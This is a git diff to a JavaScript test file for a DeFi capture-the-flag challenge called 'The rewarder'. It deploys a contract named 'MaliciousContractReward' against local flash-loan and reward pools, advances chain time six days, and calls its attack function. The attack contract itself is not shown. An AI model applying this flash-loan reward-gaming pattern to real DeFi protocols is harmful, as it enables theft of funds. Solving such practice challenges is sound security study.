@@ -45,7 +45,7 @@ describe('[Challenge] The rewarder', function () {
 
         // Advance time 5 days so that depositors can get rewards
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-        
+
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
@@ -57,20 +57,32 @@ describe('[Challenge] The rewarder', function () {
 
         // Attacker starts with zero DVT tokens in balance
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
-        
+
         // Two rounds should have occurred so far
         expect(
             await this.rewarderPool.roundNumber()
         ).to.be.eq('2');
+
+        // Initialize the malicious contract
+        const MaliciousContractRewardFacotry = await ethers.getContractFactory('MaliciousContractReward', attacker);
+        this.maliciousContractReward = await MaliciousContractRewardFacotry.deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Advance time 6 days in order to jump to the next round
+        await ethers.provider.send("evm_increaseTime", [6 * 24 * 60 * 60]); // 6 days
+        // Attack via maliciousContractReward
+        this.maliciousContractReward.attack();
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Only one round should have taken place
         expect(
             await this.rewarderPool.roundNumber()
@@ -80,12 +92,12 @@ describe('[Challenge] The rewarder', function () {
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             let rewards = await this.rewardToken.balanceOf(users[i].address);
-            
+
             // The difference between current and previous rewards balance should be lower than 0.01 tokens
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
         }
-        
+
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
         let rewards = await this.rewardToken.balanceOf(attacker.address);
